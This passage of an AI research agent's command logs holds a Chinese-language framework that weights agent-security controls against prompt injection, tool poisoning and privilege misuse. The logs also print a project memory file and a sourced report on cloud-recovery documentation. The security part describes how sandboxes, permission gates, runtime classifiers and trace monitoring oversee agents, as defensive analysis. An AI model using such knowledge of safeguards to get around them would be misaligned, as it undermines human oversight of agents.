teaming + rapid response loop”：一旦自动攻击器发现新攻击类，就立刻形成新的防守目标，驱动 adversarial training、监控与 system-level safeguards 的迭代。[S11]\\n- [事实] OpenAI 的 Agent Builder 安全指南要求 `run trace graders and evals`，原因是如果不理解模型在 trace 上做了什么，就很难持续发现 decision、tool call 和 reasoning 中的偏差。[S3]\\n- [事实] Anthropic 的 auto mode 文章公开了 classifier pipeline 在 real overeager / synthetic exfil 测试集上的 FPR/FNR，说明运行时防线不是“装了就完”，而需要持续调参与误报/漏报管理。[S8]\\n- [推断 | 置信度：高] 红队、评测和审计闭环的价值，不在于事前完美预防一切，而在于缩短“发现新攻击 -> 复现 -> 修补 -> 重新评测”的时间。\\n\\n## 推断\\n\\n### 1. 这 7 个变量应先按“硬门槛 + 加权项”建模，而不是做平面平均分\\n\\n- [推断 | 置信度：高] 安全评估应先过 3 个 `hard gates`：\\n  1. `Execution Gate`：不存在 fail-open sandbox、默认无界联网、常态化 unsandboxed fallback。\\n  2. `Privilege Gate`：不存在 `bypassPermissions`、broad default scopes、token passthrough、无限域名/工具放权。\\n  3. `Trust-Provenance Gate`：不存在“外部自由文本直达高信任上下文”或“未审计 MCP server / descriptor 直接进入自动化路径”。\\n- [推断 | 置信度：高] 只有通过这 3 个硬门槛，后续加权模型才有意义。否则系统处于“结构性脆弱”，评分再高也不该进入生产。\\n\\n### 2. 通用基线权重应如下\\n\\n| 变量 | 基线权重 | 为什么 |\\n| --- | ---: | --- |\\n| `执行隔离硬度` | `22` | 这是把注入从“文本问题”拦在“执行问题”之前的第一道硬边界。只要存在 fail-open 或 unsandboxed 常用路径，很多后续控制都会退化成补丁。 |\\n| `默认权限面与能力最小化` | `18` | 它直接决定 blast radius：能写哪里、能连哪里、能拿什么 scope、能调用哪些工具。 |\\n| `上下文信任分层` | `18` | 它决定 hostile text 是否能进入能驱动工具的高信任层，是 prompt injection / tool poisoning 是否成立的关键前提。 |\\n| `MCP/工具供应链完整性` | `15` | 在 MCP/连接器系统里，这项决定“标准化接口”是否反而成为投毒入口。 |\\n| `高后果动作运行时拦截` | `10` | 它防的是模型误解、过度主动和高风险工具调用；重要，但不能替代硬边界。 |\\n| `身份/令牌/会话绑定` | `9` | 一旦出现外部 API、connected apps、MCP server chaining，这项会明显抬升；在纯本地场景中次于前三项。 |\\n| `持续红队/评测/审计闭环` | `8` | 它决定系统是否会在现实压力和版本漂移下持续退化。属于长期解释变量，而不是第一层硬边界。 |\\n\\n- [推断 | 置信度：高] 这意味着最合理的上层分组是：\\n  - `边界变量`：`22 + 18 + 18 = 58`\\n  - `供应链/身份变量`：`15 + 9 = 24`\\n  - `运行期/反馈变量`：`10 + 8 = 18`\\n- [推断 | 置信度：高] 这组分布与 Round 1 结论完全一致：最决定结果的，依然是边界是否真实；供应链和身份是第二层放大器；运行时拦截与红队闭环则负责把系统从“一次性配置”变成“可持续安全”。\\n\\n### 3. 权重必须按部署形态重排，而不能一套分数打天下\\n\\n| 变量 | `本地受限执行` | `repo-scoped 云端 agent` | `受信 MCP 内部工具` | `企业级生产动作代理` |\\n| --- | ---: | ---: | ---: | ---: |\\n| `执行隔离硬度` | `30` | `22` | `10` | `8` |\\n| `默认权限面与能力最小化` | `22` | `18` | `16` | `15` |\\n| `上下文信任分层` | `18` | `17` | `14` | `13` |\\n| `MCP/工具供应链完整性` | `6` | `13` | `24` | `15` |\\n| `高后果动作运行时拦截` | `10` | `12` | `12` | `22` |\\n| `身份/令牌/会话绑定` | `6` | `10` | `16` | `16` |\\n| `持续红队/评测/审计闭环` | `8` | `8` | `8` | `11` |\\n| `合计` | `100` | `100` | `100` | `100` |\\n\\n- [推断 | 置信度：高] `本地受限执行` 中，首要目标是把伤害约束在工作目录和 allowlist 内，所以执行隔离和默认权限面最重。\\n- [推断 | 置信度：高] `repo-scoped 云端 agent` 中，云端隔离、分支限制和 scoped credentials 已经让身份与审计比本地更重要，但整体仍然是边界优先。\\n- [推断 | 置信度：高] `受信 MCP 内部工具` 中，最核心的不再是 shell sandbox，而是 `这个 server / descriptor / token / session 是否可信`，所以 `MCP/工具供应链完整性 + 身份绑定` 应成为第一组变量。\\n- [推断 | 置信度：高] `企业级生产动作代理` 中，真正决定事故率的，是 `高后果动作有没有 step-up confirmation`、`令牌和身份是否最小化且可追责`、`事后能否审计和回滚`，因此运行时拦截与身份审计的权重显著上升。\\n\\n### 4. 把变量映射到攻击类型后，最应优先守的仍是三条线\\n\\n| 攻击/失效类型 | 最主要变量 |\\n| --- | --- |\\n\\n====\\n\",\"exit_code\":0,\"status\":\"completed\"}}\n/Users/lifcc/Desktop/code/AI/research/theme-signal-radar-runner/logs/iteration_017.log:39:{\"type\":\"item.completed\",\"item\":{\"id\":\"item_19\",\"type\":\"command_execution\",\"command\":\"/bin/zsh -lc \\\"sed -n '1,260p' ../memory/CONTEXT.md\\\"\",\"aggregated_output\":\"# Theme Signal Radar Context\\n\\n## Fact\\n\\n- Shared workspace:\\n  - `workspace/theme-exploration-shared` points to `/Users/lifcc/Desktop/code/AI/research/theme-exploration-shared`.\\n  - Write output only to `signals/`.\\n- Signal standard:\\n  - Separate facts, inferences, and recommendations.\\n  - Preserve source URLs for every factual claim.\\n  - Prefer primary or near-primary sources.\\n  - Mark confidence as high, medium, or low.\\n  - Do not invent missing facts; weak sourcing requires an evidence-gap note.\\n- 2026-05-04: created `theme-exploration-shared/signals/2026-05-04-signal-radar-batch-001.md` with 31 source-backed signals across AI agents, coding agents, AI devtools, AI infra/pricing, creative AI, local-first tools, open-source productization, and content automation.\\n- 2026-05-04: created `theme-exploration-shared/signals/2026-05-05-signal-radar-batch-002.md` with 12 protocol/distribution signals on MCP, A2A, ACP, managed endpoints, registry surfaces, and IDE support.\\n- 2026-05-04: created queued file `theme-exploration-shared/signals/2026-05-06-signal-radar-batch-003.md` with 10 control-plane signals across approvals, auth, quotas, sandboxing, registry trust, and tool-surface minimization.\\n- 2026-05-05: created queued file `theme-exploration-shared/signals/2026-05-07-signal-radar-batch-004.md` with 9 observability/accountability signals across traces, eval loops, compliance logs, usage metering, session logs, and post-action review.\\n- 2026-05-05: created queued file `theme-exploration-shared/signals/2026-05-08-signal-radar-batch-005.md` with 9 change-control/provenance signals across frozen snapshots, action diffs, model pinning, immutable revisions, signed attestations, verified catalogs, and plugin signing/review.\\n- 2026-05-05: created queued file `theme-exploration-shared/signals/2026-05-09-signal-radar-batch-006.md` with 8 revocation/rollback signals across model retirement, attestation deletion, undeploy semantics, uninstall residue, plugin hide/remove flows, token revoke, and app-surface disable paths.\\n- 2026-05-05: created queued file `theme-exploration-shared/signals/2026-05-10-signal-radar-batch-007.md` with 9 expiry/hygiene signals across Realtime token TTLs, vector-store expiry and cleanup lag, Secret Manager rotation, Artifact Registry cleanup cadence, Docker Scout remediation, Docker MCP uninstall residue, GitHub token/activity hygiene, Actions retention windows, and Atlassian token expiry telemetry.\\n- Batch 007 kept the queue date (`2026-05-10`) separate from the verification date (`2026-05-05`).\\n- 2026-05-05: created queued file `theme-exploration-shared/signals/2026-05-11-signal-radar-batch-008.md` with 8 propagation-lag/stale-state signals across OpenAI retrieval consistency windows, Google IAM propagation, Artifact Registry cleanup cadence, Docker MCP catalog refresh delay, GitHub restore-availability lag, Atlassian token-policy latency, Atlassian pending uninstall behavior, and TeamCity scheduled cleanup.\\n- Batch 008 kept the queue date (`2026-05-11`) separate from the verification date (`2026-05-05`).\\n- 2026-05-05: created queued file `theme-exploration-shared/signals/2026-05-12-signal-radar-batch-009.md` with 8 reversibility/partial-restore signals across Google delayed-destroy and undelete contracts, Docker backup-dependent rollback, GitHub repository/package restore gaps, Atlassian service-project trash recovery, and JetBrains TeamCity artifact-restore limits.\\n- Batch 009 kept the queue date (`2026-05-12`) separate from the verification date (`2026-05-05`).\\n- 2026-05-05: created queued file `theme-exploration-shared/signals/2026-05-13-signal-radar-batch-010.md` with 8 recovery-prerequisite/restore-blocker signals across Google undelete and billing relink gates, GitHub fork-network and namespace blockers, Docker backup-sidecar/path residue requirements, Atlassian admin/email reactivation, and TeamCity empty-target plus encryption-key dependencies.\\n- Batch 010 kept the queue date (`2026-05-13`) separate from the verification date (`2026-05-05`).\\n- 2026-05-05: created queued file `theme-exploration-shared/signals/2026-05-14-signal-radar-batch-011.md` with 8 post-restore verification and rehydration signals across Google billing propagation and restart checks, Google audit/state proof surfaces, GitHub repo/org partial restore gaps, Docker mount-proof surfaces, Atlassian replay gaps, and TeamCity readiness/reindex checks.\\n- Batch 011 kept the queue date (`2026-05-14`) separate from the verification date (`2026-05-05`).\\n- 2026-05-05: created queued file `theme-exploration-shared/signals/2026-05-15-signal-radar-batch-012.md` with 8 post-recovery reconciliation/proof-bundle signals across Google asset diffs and exports, GitHub audit/member export and rebuild-query surfaces, Docker digest plus volume metadata attestations, and Atlassian inbound-email evidence logs.\\n- Batch 012 kept the queue date (`2026-05-15`) separate from the verification date (`2026-05-05`).\\n- 2026-05-05: created queued file `theme-exploration-shared/signals/2026-05-16-signal-radar-batch-013.md` with 8 recovery-drill automation and recurring proof-capture signals across Google backup schedules and compliance reports, GitHub backup loops and remote archives, Docker diagnostics and live logs, Atlassian audit-log webhooks, and TeamCity backup plus readiness surfaces.\\n- Batch 013 kept the queue date (`2026-05-16`) separate from the verification date (`2026-05-05`).\\n- 2026-05-05: created queued file `theme-exploration-shared/signals/2026-05-17-signal-radar-batch-014.md` with 8 recovery-drill blind-spot and excluded-state signals across Google compliance/logging visibility gaps, GitHub Actions external storage plus audit-stream cliffs, Docker volume omissions, Atlassian partial exports and backup allowlists, and TeamCity artifact or queue exclusions.\\n- Batch 014 kept the queue date (`2026-05-17`) separate from the verification date (`2026-05-05`).\\n- 2026-05-05: created queued file `theme-exploration-shared/signals/2026-05-18-signal-radar-batch-015.md` with 8 manual-reattachment and human-checkpoint signals across Google billing and audit-log handoffs, GitHub Actions storage plus runner reseeding, Docker volume and VM-disk sidecars, TeamCity artifact remapping, and Atlassian admin/support restore gates.\\n- Batch 015 kept the queue date (`2026-05-18`) separate from the verification date (`2026-05-05`).\\n- 2026-05-05: created queued file `theme-exploration-shared/signals/2026-05-19-signal-radar-batch-016.md` with 8 identifier-drift and reference-repair signals across Google service-account and region retargeting, Cloud SQL connection-surface rebinding, GitHub Actions storage plus runner-token invalidation, Docker path/container remapping, Atlassian link or group repair, and TeamCity ID-conflict or broken-URL repair.\\n- Batch 016 kept the queue date (`2026-05-19`) separate from the verification date (`2026-05-05`).\\n\\n## Verification\\n\\n- `python3 -m pytest`\\n  - Result: `collected 0 items`\\n  - Exit code: `5`\\n  - Meaning: this workspace currently has no executable pytest suite in this session; do not treat the repo as test-green.\\n\\n## Inference\\n\\n- Public restore contracts are now clearly time-boxed and uneven: Google uses `30`-day windows for service accounts and projects, GitHub uses `30` days for packages and `90` days for repositories, and Atlassian uses `60` days for Jira service-project trash.\\n- The more important distinction is no longer just \\\"restorable\\\" vs \\\"not restorable\\\"; it is \\\"what preconditions must still hold before restore is even allowed, and what follow-through is required before the restored system is actually live?\\\"\\n- Batch 010 shows that recovery blockers are now explicit product surfaces: name reuse, non-empty fork graphs, admin-role topology, billing relink permissions, same-path disk restore, empty destination databases, and missing encryption keys.\\n- Batch 011 shows the next shift after restore blockers: operators now need proof that reactivation converged, replay debt is understood, sidecars are reattached, and the restored system is actually ready for live use.\\n- Batch 012 shows the next shift after post-restore readiness: recovery trust is now expressed as portable artifacts such as diffable history, exported audit/member state, immutable digests, volume metadata, and raw missed-event payloads.\\n- Batch 013 shows the next shift after proof bundles: the market is starting to expose recurring drill loops directly through schedules, compliance reports, external streams, remote archives, support bundles, and readiness probes.\\n- Batch 014 shows the next shift after recurring drills: vendors are increasingly explicit about what the automation loop does not capture, including omitted payload classes, short proof retention, duplicate or partial streams, and manual-only restore dependencies.\\n- Batch 015 shows the next shift after excluded-state disclosures: the strongest signals are now the explicit human handoff points where billing, audit capture, runner trust, sidecar files, or admin approvals still need to be reattached by hand.\\n- Batch 016 shows the next shift after human checkpoints: even when recovery data is present again, stable names, URLs, tokens, group bindings, and external references often still drift and require a separate repair pass.\\n- The emerging editorial story is shifting from reversible delete to recovery-completeness operations: conflict checks, reindex progress, audit-backed rebuild manifests, compliance logs, remote archive sync, mount proofs, ready endpoints, diff exports, and missing-work reports are becoming the real signal surfaces.\\n\\n## Next\\n\\n- Produce batch 017 as a narrow post-recovery credential reissuance / auth rebinding pass.\\n- Center batch 017 on:\\n  - secrets or secure values that must be replayed or rotated after restore or import,\\n  - app, runner, connector, or OAuth surfaces that require reauthorization,\\n  - group, policy, or permission edges that need explicit regrant or review,\\n  - certificate or key replacement steps that sit after the main restore,\\n  - and official docs that admit recovered data is present but trust material still needs human repair.\\n\",\"exit_code\":0,\"status\":\"completed\"}}\n/Users/lifcc/Desktop/code/AI/research/theme-signal-radar-runner/logs/iteration_017.log:69:{\"type\":\"item.completed\",\"item\":{\"id\":\"item_35\",\"type\":\"command_execution\",\"command\":\"/bin/zsh -lc \\\"sed -n '1,240p' /Users/lifcc/Desktop/code/AI/research/theme-exploration-shared/signals/2026-05-18-signal-radar-batch-015.md\\\"\",\"aggregated_output\":\"# 2026-05-18 Signal Radar Batch 015\\n\\nVerified on 2026-05-05.\\n\\nNote:\\n- The filename follows the queue schedule.\\n- Each signal's `Date` field below refers to the source publication or page-update date when available, not the queue date.\\n\\nFocus:\\n- Manual reattachment and human checkpoint surfaces\\n- Coverage: billing or account relink steps, runner or token reseeding, external-store compatibility gates, file-system sidecar copy steps, and manually preserved audit evidence\\n\\nMethod:\\n- Facts: only claims directly supported by the linked source page.\\n- Inference: editorial read on why the source matters.\\n- Recommendation: what to watch or how to use the signal in future theme selection.\\n- Confidence: `high`, `medium`, or `low`.\\n\\n## Manual Reattachment Evidence Captured\\n\\n- Google recovery is still operator-mediated at the billing and evidence layers: restored projects can take up to 36 hours before billing relink works, some services still need manual restart, and Data Access logs remain opt-in plus manually exportable to Cloud Storage for auditors. Sources: https://docs.cloud.google.com/billing/docs/how-to/modify-project ; https://docs.cloud.google.com/billing/docs/how-to/restart-services ; https://docs.cloud.google.com/logging/docs/audit/configure-data-access ; https://docs.cloud.google.com/logging/docs/routing/copy-logs\\n- GitHub Actions recovery keeps two explicit human checkpoints outside the appliance snapshot: the exact same blob store must be preconfigured first, and all self-hosted runners must be re-registered because previous registration tokens are invalid. Source: https://docs.github.com/en/enterprise-server%403.19/admin/backing-up-and-restoring-your-instance/backup-service-for-github-enterprise-server/restoring-with-github-actions-enabled\\n- Docker still splits restore into multiple manual layers: operators must preserve recreate-time options or Compose files, restore VM-disk sidecars back to the same path on Desktop, and untar volume backups into fresh containers when state lives outside the image. Sources: https://docs.docker.com/desktop/settings-and-maintenance/backup-and-restore/ ; https://docs.docker.com/engine/storage/volumes/\\n- TeamCity keeps artifact continuity outside the backup file: artifact directories and external-storage mappings must be restored manually, and late copying can force a manual reindex before the server is healthy again. Sources: https://www.jetbrains.com/help/teamcity/restoring-teamcity-data-from-backup.html ; https://www.jetbrains.com/help/teamcity/projects-import.html\\n- Atlassian recovery is still rich in admin checkpoints: restores target only empty apps in the same organization and region, restored app access is held for manual approval because it affects billing, and deleted organizations require a support-mediated restore within 15 days. Sources: https://support.atlassian.com/organization-administration/docs/restore-product-data-from-a-backup/ ; https://support.atlassian.com/organization-administration/docs/can-i-restore-an-organization/\\n\\n## 01. Google project recovery still hands billing relink and service restart back to an operator\\n- Date: n/a (docs pages, verified 2026-05-05)\\n- Theme family: billing relink and manual service restart\\n- Facts:\\n  - Google says a restored project might take time to propagate to the Cloud Billing system and you can't successfully link a Cloud Billing account until propagation completes.\\n  - Google says if billing relink fails on a newly restored project, you should retry after about 10 minutes, then wait a few hours, and in rare cases up to 36 hours before billing can be re-enabled.\\n  - Google says if billing is re-enabled after project shutdown or account issues, some services have delays in restoring and you might need to manually restart some services.\\n  - Google says manual restart can include Compute Engine VM instances, ephemeral IP addresses, and SSDs.\\n  - Sources: https://docs.cloud.google.com/billing/docs/how-to/modify-project ; https://docs.cloud.google.com/billing/docs/how-to/restart-services\\n- Inference: Google's restore contract is not \\\"undelete and done\\\"; a human still owns the billing-control-plane handoff and the final restart pass.\\n- Why it matters: Recovery-time stories now depend on whether billing and core services converge fast enough for an operator to reattach them during the incident window.\\n- Article potential: High for a piece on how control-plane propagation delays become visible only when recovery is exercised for real.\\n- Recommendation: Track docs that publish explicit relink retry windows and manual restart lists; those are strong signals that recovery still needs operator choreography.\\n- Confidence: high\\n- Evidence gaps: The docs do not quantify how often the 36-hour edge case occurs across services or project types.\\n\\n## 02. Google makes durable audit proof an opt-in and sometimes retroactive manual step\\n- Date: n/a (docs pages, verified 2026-05-05)\\n- Theme family: manual audit-evidence capture\\n- Facts:\\n  - Google says Data Access audit logs are disabled by default for all services except some BigQuery services and must be explicitly enabled if you want them written.\\n  - Google says Data Access audit logs are stored in the `_Default` bucket unless routed elsewhere.\\n  - Google says copying already stored log entries from Cloud Logging to Cloud Storage is a manual operation done with the Google Cloud CLI.\\n  - Google says one reason to copy logs is to share them with auditors outside of Logging, and another is when you forgot to route them to Cloud Storage before they were stored.\\n  - Sources: https://docs.cloud.google.com/logging/docs/audit/configure-data-access ; https://docs.cloud.google.com/logging/docs/routing/copy-logs\\n- Inference: Google's evidence plane rewards teams that pre-wire audit capture, but still offers a manual salvage path when the export habit was missing.\\n- Why it matters: Post-recovery proof often fails not because telemetry never existed, but because nobody enabled or exported the right class of logs in time.\\n- Article potential: High for a piece on how recovery evidence is becoming a separate operational workflow from backup itself.\\n- Recommendation: Treat audit-log enablement and retroactive copy flows as first-class recovery checklist items, not observability nice-to-haves.\\n- Confidence: high\\n- Evidence gaps: These pages do not state how much recovery evidence is typically lost before teams notice that Data Access logging was left disabled.\\n\\n## 03. GitHub Actions restore only works cleanly if the external blob plane is manually reattached first\\n- Date: n/a (docs page, verified 2026-05-05)\\n- Theme family: external-store relinking\\n- Facts:\\n  - GitHub says Actions logs, artifacts, and other blobs stored in configured external storage aren't included in Backup Service snapshots.\\n  - GitHub says that, before restore, operators must enable GitHub Actions and enter the exact same external storage provider and credentials used in the original instance.\\n  - GitHub says this preconfiguration ensures restored Actions metadata correctly references the existing external data.\\n  - GitHub says the restoration process includes Actions metadata but assumes the external storage is already accessible and configured.\\n  - Source: https://docs.github.com/en/enterprise-server%403.19/admin/backing-up-and-restoring-your-instance/backup-service-for-github-enterprise-server/restoring-with-github-actions-enabled\\n- Inference: GitHub is explicit that external artifact compatibility is not auto-discovered during restore; operators must stitch the blob plane back in themselves.\\n- Why it matters: A restored control plane can still be misleadingly incomplete if logs and artifacts silently point at the wrong storage account or credentials.\\n- Article potential: High for a piece on \\\"restore compatibility gates\\\" where backup metadata is portable only if a second system is manually matched first.\\n- Recommendation: Keep separating snapshot restore from external blob reattachment whenever vendors expose a storage dependency by credential and provider identity.\\n- Confidence: high\\n- Evidence gaps: The page doesn't describe a built-in verification step that validates restored metadata against real blob accessibility before users resume traffic.\\n\\n## 04. GitHub invalidates previous runner registration tokens after restore, forcing manual runner reseeding\\n- Date: n/a (docs page, verified 2026-05-05)\\n- Theme family: runner re-registration\\n- Facts:\\n  - GitHub says that after restoring an instance with Actions enabled, all self-hosted runners must be re-registered with the restored instance.\\n  - GitHub says previous registration tokens are invalid after a restore.\\n  - Source: https://docs.github.com/en/enterprise-server%403.19/admin/backing-up-and-restoring-your-instance/backup-service-for-github-enterprise-server/restoring-with-github-actions-enabled\\n- Inference: Runner continuity is intentionally broken across restore boundaries so operators must issue fresh trust material before work resumes.\\n- Why it matters: Recovery plans that validate only web or API availability can miss the moment where CI/CD is still dead because the execution fleet has not been reseeded.\\n- Article potential: High for a piece on how token invalidation is becoming a visible post-recovery safety boundary rather than a hidden implementation detail.\\n- Recommendation: Watch for products that explicitly require token, credential, or agent re-registration after restore; that checkpoint is a strong indicator of real trust-boundary reset behavior.\\n- Confidence: high\\n- Evidence gaps: The page doesn't provide a bulk verification surface for confirming every prior runner has been re-registered and returned healthy.\\n\\n## 05. Docker Desktop recovery still depends on operator-owned recreate metadata and same-path disk sidecars\\n- Date: n/a (docs page, verified 2026-05-05)\\n- Theme family: recreate metadata and same-path sidecars\\n- Facts:\\n  - Docker says if you use volumes or bind mounts for container data, you should remember the options used when creating the container or use a Docker Compose file to recreate the same configuration after re-installation.\\n  - Docker says filesystem changes in attached volumes are not included in the committed image and must be backed up separately.\\n  - Docker says if Docker Desktop fails to start and must be reinstalled, you can back up the VM disk directly from disk and then restore `Docker.raw` or `docker_data.vhdx` back to the same location after reinstalling.\\n  - Docker says on Windows you might also need to re-import WSL distributions after restore.\\n  - Source: https://docs.docker.com/desktop/settings-and-maintenance/backup-and-restore/\\n- Inference: Docker's official recovery path assumes that part of the restore contract lives in operator memory and file placement, not only in images or automated backup tooling.\\n- Why it matters: In containerized environments, the missing ingredient is often not the image itself but the remembered runtime wiring that made the workload usable.\\n- Article potential: High for a piece on why local and developer-facing recovery still depends on sidecar files, mount options, and recreate-time metadata.\\n- Recommendation: Prefer recovery docs that admit when configuration replay and same-path disk restoration are still human-owned steps; that honesty is more useful than generic \\\"reinstall and recover\\\" language.\\n- Confidence: high\\n- Evidence gaps: The page doesn't define a native post-restore integrity check that proves container config, VM disk state, and WSL imports all line up correctly.\\n\\n## 06. Docker volume recovery remains an explicit untar-into-a-fresh-container workflow\\n- Date: n/a (docs page, verified 2026-05-05)\\n- Theme family: manual volume reattachment\\n- Facts:\\n  - Docker's documented restore example creates a new container and then untars the backup into that container's data volume with `docker run --rm --volumes-from ...`.\\n  - Docker says this volume backup can be restored to the same container or to another container created elsewhere.\\n  - Source: https://docs.docker.com/engine/storage/volumes/\\n- Inference: Docker is clear that persistent state is not recovered by flipping a high-level restore switch; operators rehydrate it by mounting the right volume into the right container and replaying the archive.\\n- Why it matters: This is exactly the kind of file-system sidecar step that disappears from product marketing but dominates real recovery runbooks.\\n- Article potential: Medium-high for a piece on how \\\"volume restore\\\" remains a portable but still low-level primitive in modern container operations.\\n- Recommendation: Track products whose official restore docs still surface tar, mount, and container-creation steps directly; those pages are strong signals that manual reattachment remains core to the recovery path.\\n- Confidence: high\\n- Evidence gaps: The page does not provide a higher-level native verification command that confirms restored application semantics, only the storage rehydration mechanics.\\n\\n## 07. TeamCity backup restore still treats artifacts and artifact mappings as manual sidecars\\n- Date: 2025-05-19 doc date; verified 2026-05-05\\n- Theme family: artifact-sidecar copy and reindex checkpoints\\n- Facts:\\n  - JetBrains says a TeamCity backup file does not contain build artifacts.\\n  - JetBrains says operators must manually copy build logs and artifacts from the artifact directory to the new location.\\n  - JetBrains says that when external artifacts storage is enabled, the artifact directory contains metadata about artifact mappings and those mappings must also be restored.\\n  - JetBrains says artifacts should be copied before server start because missing artifacts during automatic indexing can cause parts of the server to fail, and late copying may require manual reindexing.\\n  - JetBrains also says project-import backups do not contain artifacts and logs, but TeamCity provides scripts to move them manually between source and target servers.\\n  - Sources: https://www.jetbrains.com/help/teamcity/restoring-teamcity-data-from-backup.html ; https://www.jetbrains.com/help/teamcity/projects-import.html\\n- Inference: TeamCity's control plane is restorable, but artifact continuity still depends on separate file movement and timing-sensitive operator decisions.\\n- Why it matters: CI recovery without artifacts, logs, or artifact mappings is often operationally incomplete even when the database comes back cleanly.\\n- Article potential: High for a piece on how CI products keep file-system residue outside the primary restore artifact.\\n- Recommendation: Keep flagging backup docs that separate metadata restore from artifact-plane restore; that split is a strong indicator of hidden recovery toil.\\n- Confidence: high\\n- Evidence gaps: The docs don't quantify how often late artifact copy triggers downstream failures beyond the example of a NuGet feed.\\n\\n## 08. Atlassian recovery keeps both app restore and organization restore behind explicit human checkpoints\\n- Date: n/a (docs pages, verified 2026-05-05)\\n- Theme family: admin checkpoints and support-only handoff\\n- Facts:\\n  - Atlassian says backups can only be restored to apps that are empty and contain no user-generated data, and recommends restoring to a newly provisioned app.\\n  - Atlassian says restore targets must be in the same organization and same region as the backed-up app.\\n  - Atlassian says restored app access is not applied automatically; administrators must review and approve app access because it affects billing.\\n  - Atlassian says if you need to restore an organization, you must contact Atlassian support within 15 days of deleting it.\\n  - Atlassian says organization restore only returns the organization to the state it was in when deleted; removed domains, apps, or other changes made before deletion cannot be restored.\\n  - Sources: https://support.atlassian.com/organization-administration/docs/restore-product-data-from-a-backup/ ; https://support.atlassian.com/organization-administration/docs/can-i-restore-an-organization/\\n- Inference: Atlassian makes recovery boundaries explicit at two levels: app data restore remains admin-gated, while organization-level recovery is a time-boxed support escalation rather than a self-service button.\\n- Why it matters: This is the clearest kind of human checkpoint signal: even when backups exist, restoration authority, billing impact, and tenant-scope recovery are intentionally not fully automated.\\n- Article potential: High for a piece on where SaaS recovery vendors deliberately stop and hand the workflow back to admins or support.\\n- Recommendation: Keep prioritizing docs that expose restore preconditions, approval gates, and support-only escalations in plain language; they reveal the real boundary of the automated recovery story.\\n- Confidence: high\\n- Evidence gaps: The docs don't publish elapsed-time expectations for the support-mediated organization restore path or a machine-readable status surface for app-access reapproval progress.\\n\\n## Current Editorial Read\\n\\n- Facts:\\n  - The clearest recovery signals are no longer just retention windows or restore blockers. They are the places where vendors openly admit an operator still has to relink billing, re-enable audit capture, re-register runners, restore sidecar files, approve access, or call support.\\n  - The manual surfaces cluster around three layers: trust reseeding, state reattachment, and proof preservation. GitHub forces new runner registration tokens, Google keeps audit capture opt-in, Docker and TeamCity require file-system sidecars, and Atlassian keeps key tenant-scope restores behind admins or support.\\n  - External-state compatibility remains one of the strongest patterns: GitHub's blob storage, Docker's volumes and VM disks, and TeamCity's artifact mappings all sit partly outside the main restore artifact.\\n- Inference:\\n  - Recovery tooling is increasingly honest that \\\"restore completed\\\" is not the end of the workflow. The market signal is shifting toward who documents the operator handoff most clearly.\\n  - The next strong editorial move is to study what happens after those manual steps: identifier drift, broken links, invalid tokens, and remapped artifacts that still need repair even after the system is nominally back.\\n- Recommendation:\\n  - Queue the next batch around post-recovery identifier drift and reference repair surfaces: broken links, regenerated IDs, invalidated tokens, remapped artifacts, and repair tools that exist only after the main restore.\\n  - Keep favoring official docs that publish both the automated boundary and the human follow-through. Those are the highest-signal recovery surfaces right now.\\n\",\"exit_code\":0,\"status\":\"completed\"}}\n/Users/lifcc/Desktop/code/AI/research/theme-signal-radar-runner/logs/iteration_019.log:25:{\"type\":\"item.completed\",\"item\":{\"id\":\"item_12\",\"type\":\"command_execution\",\"command\":\"/bin/zsh -lc \\\"sed -n '1,220p' /Users/lifcc/Desktop/code/AI/research/theme-signal-radar-runner/memory/CONTEXT.md\\\"\",\"aggregated_output\":\"# Theme Signal Radar Context\\n\\n## Fact\\n\\n- Shared workspace:\\n  - `workspace/theme-exploration-shared` points to `/Users/lifcc/Desktop/code/AI/research/theme-exploration-shared`.\\n  - Write output only to `signals/`.\\n- Signal standard:\\n  - Separate facts, inferences, and recommendations.\\n  - Preserve source URLs for every factual claim.\\n  - Prefer primary or near-primary sources.\\n  - Mark confidence as high, medium, or low.\\n  - Do not invent missing facts; weak sourcing requires an evidence-gap note.\\n- 2026-05-04: created `theme-exploration-shared/signals/2026-05-04-signal-radar-batch-001.md` with 31 source-backed signals across AI agents, coding agents, AI devtools, AI infra/pricing, creative AI, local-first tools, open-source productization, and content automation.\\n- 2026-05-04: created `theme-exploration-shared/signals/2026-05-05-signal-radar-batch-002.md` with 12 protocol/distribution signals on MCP, A2A, ACP, managed endpoints, registry surfaces, and IDE support.\\n- 2026-05-04: created queued file `theme-exploration-shared/signals/2026-05-06-signal-radar-batch-003.md` with 10 control-plane signals across approvals, auth, quotas, sandboxing, registry trust, and tool-surface minimization.\\n- 2026-05-05: created queued file `theme-exploration-shared/signals/2026-05-07-signal-radar-batch-004.md` with 9 observability/accountability signals across traces, eval loops, compliance logs, usage metering, session logs, and post-action review.\\n- 2026-05-05: created queued file `theme-exploration-shared/signals/2026-05-08-signal-radar-batch-005.md` with 9 change-control/provenance signals across frozen snapshots, action diffs, model pinning, immutable revisions, signed attestations, verified catalogs, and plugin signing/review.\\n- 2026-05-05: created queued file `theme-exploration-shared/signals/2026-05-09-signal-radar-batch-006.md` with 8 revocation/rollback signals across model retirement, attestation deletion, undeploy semantics, uninstall residue, plugin hide/remove flows, token revoke, and app-surface disable paths.\\n- 2026-05-05: created queued file `theme-exploration-shared/signals/2026-05-10-signal-radar-batch-007.md` with 9 expiry/hygiene signals across Realtime token TTLs, vector-store expiry and cleanup lag, Secret Manager rotation, Artifact Registry cleanup cadence, Docker Scout remediation, Docker MCP uninstall residue, GitHub token/activity hygiene, Actions retention windows, and Atlassian token expiry telemetry.\\n- Batch 007 kept the queue date (`2026-05-10`) separate from the verification date (`2026-05-05`).\\n- 2026-05-05: created queued file `theme-exploration-shared/signals/2026-05-11-signal-radar-batch-008.md` with 8 propagation-lag/stale-state signals across OpenAI retrieval consistency windows, Google IAM propagation, Artifact Registry cleanup cadence, Docker MCP catalog refresh delay, GitHub restore-availability lag, Atlassian token-policy latency, Atlassian pending uninstall behavior, and TeamCity scheduled cleanup.\\n- Batch 008 kept the queue date (`2026-05-11`) separate from the verification date (`2026-05-05`).\\n- 2026-05-05: created queued file `theme-exploration-shared/signals/2026-05-12-signal-radar-batch-009.md` with 8 reversibility/partial-restore signals across Google delayed-destroy and undelete contracts, Docker backup-dependent rollback, GitHub repository/package restore gaps, Atlassian service-project trash recovery, and JetBrains TeamCity artifact-restore limits.\\n- Batch 009 kept the queue date (`2026-05-12`) separate from the verification date (`2026-05-05`).\\n- 2026-05-05: created queued file `theme-exploration-shared/signals/2026-05-13-signal-radar-batch-010.md` with 8 recovery-prerequisite/restore-blocker signals across Google undelete and billing relink gates, GitHub fork-network and namespace blockers, Docker backup-sidecar/path residue requirements, 